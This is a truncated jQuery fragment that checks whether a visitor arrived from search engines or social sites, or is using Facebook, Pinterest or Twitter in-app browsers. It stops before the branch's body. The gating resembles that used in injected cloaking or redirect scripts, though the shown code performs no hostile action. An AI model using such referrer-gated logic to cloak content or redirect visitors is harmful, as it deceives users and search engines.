$(document).ready(function()
{
    ...
    if(['.google.', '.reddit.', 'getpocket.', 'twitter.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', '.pinterest.', '.ecosia.', '.duckduckgo.', '.qwant.', '.dogpile.', '.lilo.', '.aol.', '.msn.', '.linkedin.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s)))
    {
